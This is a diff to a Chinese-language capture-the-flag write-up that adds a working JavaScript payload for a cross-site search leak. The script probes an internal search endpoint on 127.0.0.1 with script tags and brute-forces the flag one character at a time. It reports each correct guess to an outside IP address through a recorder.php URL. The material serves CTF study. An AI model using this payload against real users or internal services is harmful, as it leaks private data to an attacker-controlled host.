@@ -258,6 +258,42 @@ exploit();
 
 ​	这个JS已经能够实现利用CSRF远程访问目标机了，但是不能正确区分正确包和错误包。
 
+#### 后续：
+
+​	根据提供的WP，我改造了一下，得到了下面的payload：
+
+```javascript
+// 修改后的异步版本
+let flag = 'nctf{';
+async function checkError(currentFlag) {
+  return new Promise((resolve) => {
+    const url = `http://127.0.0.1:8000/internal/search?s=${currentFlag}`;
+    const script = document.createElement('script');
+    script.src = url;
+    script.onload = () => {
+      fetch(`http://52.221.194.237:64074/recorder.php?leak=${currentFlag}`)
+        .finally(() => resolve()); // 确保请求完成才继续
+      flag = currentFlag;
+    };
+    script.onerror = () => resolve(); // 错误时也继续流程
+    document.head.appendChild(script);
+  });
+}
+async function bruteForce(curdepth) {
+  if(curdepth == 30){
+    return;
+  }
+  const charset = 'abcdefghijklmnopqrstuvwxyz0123456789-}';
+  for (const c of charset) {
+    const newFlag = flag + c;
+    await checkError(newFlag); // 等待当前请求完成
+  }
+  bruteForce(curdepth+1);
+}
+// 执行爆破
+bruteForce(0);
+```
+
 ## x1guessgame
 
 ​	这道题是区块链的题目，我的思路只能得到hash过后的answer，所以也卡住了。
